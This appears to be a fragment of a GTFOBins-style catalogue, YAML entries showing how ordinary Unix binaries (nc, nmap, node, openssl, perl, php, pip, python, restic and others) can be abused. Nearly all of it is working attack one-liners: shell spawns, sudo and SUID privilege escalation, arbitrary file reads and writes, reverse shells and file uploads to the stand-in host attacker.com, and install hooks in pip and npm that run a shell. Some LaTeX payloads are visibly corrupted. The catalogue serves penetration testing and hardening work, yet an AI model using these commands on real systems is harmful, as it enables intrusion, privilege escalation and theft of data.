+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.
+code: |
+LPORT=12345
+nc -l -p $LPORT -e /bin/sh
+file-upload:
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+nc $RHOST $RPORT < "$LFILE"
+file-download:
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
+code: |
+LPORT=12345
+LFILE=file_to_save
+nc -l -p $LPORT > "$LFILE"
+sudo:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
+code: |
+RHOST=attacker.com
+RPORT=12345
+sudo nc -e /bin/sh $RHOST $RPORT
+limited-suid:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
+code: |
+RHOST=attacker.com
+RPORT=12345
+./nc -e /bin/sh $RHOST $RPORT
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp)
+echo 'exec /bin/sh' >$TF
+neofetch --config $TF
+file-read:
+- description: The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.
+code: |
+LFILE=file_to_read
+neofetch --ascii $LFILE
+sudo:
+- code: |
+TF=$(mktemp)
+echo 'exec /bin/sh' >$TF
+sudo neofetch --config $TF
+---
+description: The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version `nftables` v0.9.0.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+nft -f "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./nft -f "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo nft -f "$LFILE"
+---
+functions:
+shell:
+- code: nice /bin/sh
+suid:
+- code: ./nice /bin/sh -p
+sudo:
+- code: sudo nice /bin/sh
+---
+description: The read file content is corrupted by a leading space added to each line.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+nl -bn -w1 -s '' $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./nl -bn -w1 -s '' $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo nl -bn -w1 -s '' $LFILE
+---
+description: The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+nm @$LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./nm @$LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo nm @$LFILE
+---
+functions:
+shell:
+- description: Input echo is disabled.
+code: |
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+nmap --script=$TF
+- description: The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+code: |
+nmap --interactive
+nmap> !sh
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+TF=$(mktemp)
+echo 'local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();' > $TF
+nmap --script=$TF
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell.
+code: |
+export LPORT=12345
+TF=$(mktemp)
+echo 'local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();' > $TF
+nmap --script=$TF
+file-upload:
+- description: Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
+code: |
+RHOST=attacker.com
+RPORT=8080
+LFILE=file_to_send
+nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+TF=$(mktemp)
+echo 'local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();' > $TF
+nmap --script=$TF
+file-download:
+- description: Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
+code: |
+RHOST=attacker.com
+RPORT=8080
+TF=$(mktemp -d)
+LFILE=file_to_save
+nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+TF=$(mktemp)
+echo 'local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);' > $TF
+nmap --script=$TF
+file-write:
+- code: |
+TF=$(mktemp)
+echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
+nmap --script=$TF
+- description: The payload appears inside the regular nmap output.
+code: |
+LFILE=file_to_write
+nmap -oG=$LFILE DATA
+file-read:
+- code: |
+TF=$(mktemp)
+echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
+nmap --script=$TF
+sudo:
+- description: Input echo is disabled.
+code: |
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+- description: The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+code: |
+sudo nmap --interactive
+nmap> !sh
+limited-suid:
+- description: Input echo is disabled.
+code: |
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+./nmap --script=$TF
+suid:
+- description: The payload appears inside the regular nmap output.
+code: |
+LFILE=file_to_write
+./nmap -oG=$LFILE DATA
+---
+functions:
+shell:
+- code: |
+node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+file-write:
+- code: node -e 'require("fs").writeFileSync("file_to_write", "DATA")'
+file-read:
+- code: node -e 'process.stdout.write(require("fs").readFileSync("/bin/ls"))'
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
+file-upload:
+- description: Send a local file via HTTP POST request.
+code: |
+export URL=http://attacker.com
+export LFILE=file_to_send
+node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").connect(process.env.RPORT, process.env.RHOST, function () {
+this.pipe(sh.stdin);
+sh.stdout.pipe(this);
+sh.stderr.pipe(this);
+})'
+bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell.
+code: |
+export LPORT=12345
+node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").createServer(function (client) {
+client.pipe(sh.stdin);
+sh.stdout.pipe(client);
+sh.stderr.pipe(client);
+}).listen(process.env.LPORT)'
+suid:
+- code: |
+./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+sudo:
+- code: |
+sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+capabilities:
+- code: |
+./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+---
+functions:
+shell:
+- code: nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
+command:
+- code: |
+COMMAND='/usr/bin/id'
+nohup "$COMMAND"
+cat nohup.out
+suid:
+- code: ./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
+sudo:
+- code: sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
+---
+functions:
+shell:
+- code: npm exec /bin/sh
+- description: Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.
+code: |
+TF=$(mktemp -d)
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+npm -C $TF i
+sudo:
+- description: Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.
+code: |
+TF=$(mktemp -d)
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+sudo npm -C $TF --unsafe-perm i
+---
+functions:
+file-read:
+- description: The file is typeset and some warning messages may appear.
+code: |
+LFILE=file_to_read
+nroff $LFILE
+shell:
+- code: |
+TF=$(mktemp -d)
+echo '#!/bin/sh' > $TF/groff
+echo '/bin/sh' >> $TF/groff
+chmod +x $TF/groff
+GROFF_BIN_PATH=$TF nroff
+sudo:
+- code: |
+TF=$(mktemp -d)
+echo '#!/bin/sh' > $TF/groff
+echo '/bin/sh' >> $TF/groff
+chmod +x $TF/groff
+sudo GROFF_BIN_PATH=$TF nroff
+---
+functions:
+shell:
+- code: nsenter /bin/sh
+sudo:
+- code: sudo nsenter /bin/sh
+---
+description: The payloads are compatible with GUI.
+functions:
+shell:
+- code: octave-cli --eval 'system("/bin/sh")'
+file-write:
+- code: octave-cli --eval 'filename = "file_to_write"; fid = fopen(filename, "w"); fputs(fid, "DATA"); fclose(fid);'
+file-read:
+- code: octave-cli --eval 'format none; fid = fopen("file_to_read"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
+sudo:
+- code: sudo octave-cli --eval 'system("/bin/sh")'
+limited-suid:
+- code: ./octave-cli --eval 'system("/bin/sh")'
+---
+description: Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+od -An -c -w9999 "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./od -An -c -w9999 "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo od -An -c -w9999 "$LFILE"
+---
+functions:
+reverse-shell:
+- description: |
+To receive the shell run the following on the attacker box:
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+Communication between attacker and target will be encrypted.
+code: |
+RHOST=attacker.com
+RPORT=12345
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+file-upload:
+- description: |
+To collect the file run the following on the attacker box:
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
+
+Send a local file via TCP. Transmission will be encrypted.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
+file-download:
+- description: |
+To send the file run the following on the attacker box:
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send
+
+Fetch a file from a TCP port, transmission will be encrypted.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
+file-write:
+- code: |
+LFILE=file_to_write
+echo DATA | openssl enc -out "$LFILE"
+- code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo "DATA" > $TF
+openssl enc -in "$TF" -out "$LFILE"
+file-read:
+- code: |
+LFILE=file_to_read
+openssl enc -in "$LFILE"
+suid:
+- description: |
+To receive the shell run the following on the attacker box:
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+Communication between attacker and target will be encrypted.
+code: |
+RHOST=attacker.com
+RPORT=12345
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+
+- code: |
+LFILE=file_to_write
+echo DATA | openssl enc -out "$LFILE"
+sudo:
+- description: |
+To receive the shell run the following on the attacker box:
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+Communication between attacker and target will be encrypted.
+code: |
+RHOST=attacker.com
+RPORT=12345
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+library-load:
+- code: openssl req -engine ./lib.so
+---
+functions:
+shell:
+- code: |
+openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+file-read:
+- description: The file is actually parsed and the first partial wrong line is returned in an error message.
+code: |
+LFILE=file_to_read
+openvpn --config "$LFILE"
+suid:
+- code: |
+./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
+- description: The file is actually parsed and the first partial wrong line is returned in an error message.
+code: |
+LFILE=file_to_read
+./openvpn --config "$LFILE"
+sudo:
+- code: |
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+- description: The file is actually parsed and the first partial wrong line is returned in an error message.
+code: |
+LFILE=file_to_read
+sudo openvpn --config "$LFILE"
+---
+functions:
+sudo:
+- description: The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.
+code: |
+COMMAND=id
+TF=$(mktemp -u)
+sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
+cat $TF
+---
+functions:
+sudo:
+- description: |
+It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+TF=$(mktemp -d)
+echo 'exec /bin/sh' > $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+```
+code: |
+sudo opkg install x_1.0_all.deb
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+paste $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+paste $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo paste $LFILE
+---
+functions:
+file-read:
+- description: The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.
+code: |
+LFILE=file_to_read
+pax -w "$LFILE"
+---
+description: This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.
+functions:
+shell:
+- code: |
+TF=$(mktemp)
+echo 'import os; os.system("/bin/sh")' > $TF
+pdb $TF
+cont
+sudo:
+- code: |
+TF=$(mktemp)
+echo 'import os; os.system("/bin/sh")' > $TF
+sudo pdb $TF
+cont
+---
+functions:
+shell:
+- code: |
+pdflatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+file-read:
+- description: The read file will be part of the output.
+code: |
+pdflatex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+pdftotext article.pdf -
+sudo:
+- description: The read file will be part of the output.
+code: |
+sudo pdflatex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+pdftotext article.pdf -
+- code: |
+sudo pdflatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+limited-suid:
+- code: |
+./pdflatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+---
+functions:
+shell:
+- code: |
+pdftex --shell-escape '\write18{/bin/sh}nd'
+sudo:
+- code: |
+sudo pdftex --shell-escape '\write18{/bin/sh}nd'
+limited-suid:
+- code: |
+./pdftex --shell-escape '\write18{/bin/sh}nd'
+---
+functions:
+shell:
+- code: |
+perf stat /bin/sh
+suid:
+- code: |
+./perf stat /bin/sh -p
+sudo:
+- code: |
+sudo perf stat /bin/sh
+---
+functions:
+shell:
+- code: perl -e 'exec "/bin/sh";'
+file-read:
+- code: |
+LFILE=file_to_read
+perl -ne print $LFILE
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+suid:
+- code: ./perl -e 'exec "/bin/sh";'
+sudo:
+- code: sudo perl -e 'exec "/bin/sh";'
+capabilities:
+- code: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+---
+functions:
+shell:
+- code: |
+pg /etc/profile
+!/bin/sh
+file-read:
+- code: pg file_to_read
+sudo:
+- code: |
+sudo pg /etc/profile
+!/bin/sh
+suid:
+- code: ./pg file_to_read
+---
+functions:
+shell:
+- code: |
+export CMD="/bin/sh"
+php -r 'system(getenv("CMD"));'
+- code: |
+export CMD="/bin/sh"
+php -r 'passthru(getenv("CMD"));'
+- code: |
+export CMD="/bin/sh"
+php -r 'print(shell_exec(getenv("CMD")));'
+- code: |
+export CMD="/bin/sh"
+php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\n",$r));'
+- code: |
+export CMD="/bin/sh"
+php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+command:
+- code: |
+export CMD="id"
+php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
+file-upload:
+- description: Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.
+code: |
+LHOST=0.0.0.0
+LPORT=8888
+php -S $LHOST:$LPORT
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
+suid:
+- code: |
+CMD="/bin/sh"
+./php -r "pcntl_exec('/bin/sh', ['-p']);"
+sudo:
+- code: |
+CMD="/bin/sh"
+sudo php -r "system('$CMD');"
+capabilities:
+- code: |
+CMD="/bin/sh"
+./php -r "posix_setuid(0); system('$CMD');"
+file-read:
+- code: |
+export LFILE=file_to_read
+php -r 'readfile(getenv("LFILE"));'
+file-write:
+- description: write data to a file, filename should be absolute.
+code: |
+export LFILE=file_to_write
+php -r 'file_put_contents(getenv("LFILE"), "DATA");'
+---
+functions:
+file-read:
+- description: The output is prefixed with a some content as a header.
+code: |
+LFILE=file_to_read
+pic $LFILE
+shell:
+- code: |
+pic -U
+.PS
+sh X sh X
+sudo:
+- code: |
+sudo pic -U
+.PS
+sh X sh X
+limited-suid:
+- code: |
+./pic -U
+.PS
+sh X sh X
+---
+functions:
+shell:
+- code: |
+pico
+^R^X
+reset; sh 1>&0 2>&0
+- description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+code: |
+pico -s /bin/sh
+/bin/sh
+^T
+file-write:
+- code: |
+pico file_to_write
+DATA
+^O
+file-read:
+- code: pico file_to_read
+limited-suid:
+- description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+code: |
+./pico -s /bin/sh
+/bin/sh
+^T
+sudo:
+- code: |
+sudo pico
+^R^X
+reset; sh 1>&0 2>&0
+---
+functions:
+command:
+- code: |
+COMMAND=id
+pidstat -e $COMMAND
+sudo:
+- code: |
+COMMAND=id
+sudo pidstat -e $COMMAND
+suid:
+- code: |
+COMMAND=id
+./pidstat -e $COMMAND
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+pip install $TF
+reverse-shell:
+- description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+TF=$(mktemp -d)
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")' > $TF/setup.py
+pip install $TF
+file-upload:
+- description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+TF=$(mktemp -d)
+echo 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
+pip install $TF
+- description: Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+TF=$(mktemp -d)
+echo 'import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
+pip install $TF
+file-download:
+- description: Fetch a remote file via HTTP GET request. It needs an absolute local file path.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=/tmp/file_to_save
+TF=$(mktemp -d)
+echo 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
+pip install $TF
+file-write:
+- description: It needs an absolute local file path.
+code: |
+export LFILE=/tmp/file_to_save
+TF=$(mktemp -d)
+echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
+pip install $TF
+file-read:
+- description: The read file content is corrupted as wrapped within an exception error.
+code: |
+TF=$(mktemp -d)
+echo 'raise Exception(open("file_to_read").read())' > $TF/setup.py
+pip install $TF
+library-load:
+- code: |
+TF=$(mktemp -d)
+echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
+pip install $TF
+sudo:
+- code: |
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+---
+functions:
+sudo:
+- code: sudo pkexec /bin/sh
+---
+functions:
+sudo:
+- description: |
+It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
+```
+code: |
+sudo pkg install -y --no-repo-update ./x-1.0.txz
+---
+description: Some bytes are altered so it might not be suitable for binary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+pr -T $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+pr -T $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+pr -T $LFILE
+---
+functions:
+shell:
+- code: |
+pry
+system("/bin/sh")
+sudo:
+- code: |
+sudo pry
+system("/bin/sh")
+limited-suid:
+- code: |
+./pry
+system("/bin/sh")
+---
+functions:
+shell:
+- code: |
+psftp
+!/bin/sh
+limited-suid:
+- code: |
+sudo psftp
+!/bin/sh
+sudo:
+- code: |
+sudo psftp
+!/bin/sh
+---
+description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+functions:
+shell:
+- code: |
+psql
+\?
+!/bin/sh
+sudo:
+- code: |
+psql
+\?
+!/bin/sh
+---
+description: While the program is capable of reading the file, it outputs a "permuted index" of its content, thus altering it. Adjusting the options could yield more readable outputs.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+ptx -w 5000 "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./ptx -w 5000 "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ptx -w 5000 "$LFILE"
+---
+functions:
+shell:
+- code: |
+puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
+file-write:
+- description: The file path must be absolute.
+code: |
+LFILE="/tmp/file_to_write"
+puppet apply -e "file { '$LFILE': content => 'DATA' }"
+file-read:
+- description: The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.
+code: |
+LFILE=file_to_read
+puppet filebucket -l diff /dev/null $LFILE
+sudo:
+- code: |
+sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
+---
+description: The payloads are compatible with both Python version 2 and 3.
+functions:
+shell:
+- code: python -c 'import os; os.system("/bin/sh")'
+reverse-shell:
+- description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+file-upload:
+- description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
+- description: Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+python -c 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])'
+file-write:
+- code: python -c 'open("file_to_write","w+").write("DATA")'
+file-read:
+- code: python -c 'print(open("file_to_read").read())'
+library-load:
+- code: python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
+suid:
+- code: ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+sudo:
+- code: sudo python -c 'import os; os.system("/bin/sh")'
+capabilities:
+- code: ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+---
+functions:
+file-read:
+- description: The file is actually parsed and the first wrong line is returned in an error message.
+code: |
+LFILE=file-to-read
+rake -f $LFILE
+shell:
+- code: rake -p '`/bin/sh 1>&0`'
+sudo:
+- code: sudo rake -p '`/bin/sh 1>&0`'
+limited-suid:
+- code: ./rake -p '`/bin/sh 1>&0`'
+---
+description: |
+Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+readelf -a @$LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./readelf -a @$LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo readelf -a @$LFILE
+---
+description: Read and write files limited to the current directory.
+functions:
+file-write:
+- code: |
+red file_to_write
+a
+DATA
+.
+w
+q
+file-read:
+- code: |
+red file_to_read
+,p
+q
+sudo:
+- code: |
+sudo red file_to_write
+a
+DATA
+.
+w
+q
+---
+description: The file is actually parsed as a Markdown file.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+redcarpet "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo redcarpet "$LFILE"
+---
+description: |
+The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:
+
+```console
+RPORT=12345
+NAME=backup_name
+./rest-server --listen ":$RPORT"
+restic init -r "rest:http://localhost:$RPORT/$NAME"
+```
+
+To extract the data from the restic repository in the current directory on the attacker side:
+
+```console
+restic restore -r "/tmp/restic/$NAME" latest --target .
+```
+
+Upload data to the attacker server with the following commands.
+functions:
+file-upload:
+- code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_or_dir_to_get
+NAME=backup_name
+restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
+sudo:
+- code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_or_dir_to_get
+NAME=backup_name
+sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
+suid:
+- code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_or_dir_to_get
+NAME=backup_name
+./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+rev $LFILE | rev
+suid:
